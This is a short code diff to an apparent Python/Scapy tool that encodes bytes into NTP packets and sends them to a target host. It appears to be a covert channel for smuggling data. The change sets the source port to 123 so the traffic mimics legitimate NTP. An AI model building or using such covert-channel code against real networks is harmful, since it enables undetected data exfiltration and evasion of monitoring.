@@ -59,7 +59,7 @@ def build_request(bit, byte_char):
 
 
 def send_ntp_request(target_ip, bit, byte_char):
-    pkt = IP(dst=target_ip) / UDP(sport=RandShort(), dport=123) / build_request(bit, byte_char)
+    pkt = IP(dst=target_ip) / UDP(sport=123, dport=123) / build_request(bit, byte_char)
     send(pkt, verbose=0)
     print(f"[+] Sent byte '{byte_char}' (0x{ord(byte_char):02x}) to {target_ip}")
     
